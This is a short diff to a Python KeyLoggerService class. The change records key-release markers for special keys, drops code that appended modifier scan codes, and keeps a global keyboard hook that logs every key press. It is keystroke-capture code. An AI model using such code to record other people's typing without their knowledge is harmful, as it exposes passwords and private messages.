@@ -7,19 +7,16 @@ class KeyLoggerService(AbstractKeyLoggerService):
         super().__init__()
         self.flag = False
 
+
     def _on_event(self, event):
-        # print(vars(event))
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
             if len(key)> 1:
                 key = f"[{key}]"
-            pressed_keys = list(keyboard._pressed_events)
-            if len(pressed_keys)>1:
-                for sc in pressed_keys:
-                    cher = keyboard.key_to_scan_codes(sc)
-                    if cher and self.keys[-1] != cher:
-                        key +=f"+{cher}"
             self.keys.append(key)
+
+        elif len(event.name)>1 and event.event_type == keyboard.KEY_UP:
+                self.keys.append( f"[{event.name} END]")
 
     def start_logging(self)-> None:
         keyboard.hook(self._on_event)
